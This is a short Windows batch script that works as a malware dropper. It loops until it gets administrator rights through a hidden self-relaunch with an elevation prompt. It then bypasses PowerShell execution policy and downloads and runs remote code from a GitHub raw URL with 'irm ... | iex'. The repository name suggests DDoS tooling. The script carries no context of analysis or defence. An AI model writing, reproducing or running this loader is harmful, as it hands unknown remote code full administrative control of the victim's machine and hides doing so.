@echo off
:retry
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    timeout /t 1 /nobreak >nul
    goto retry
)
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/srap18/ddoss/main/1122 | iex"
pause
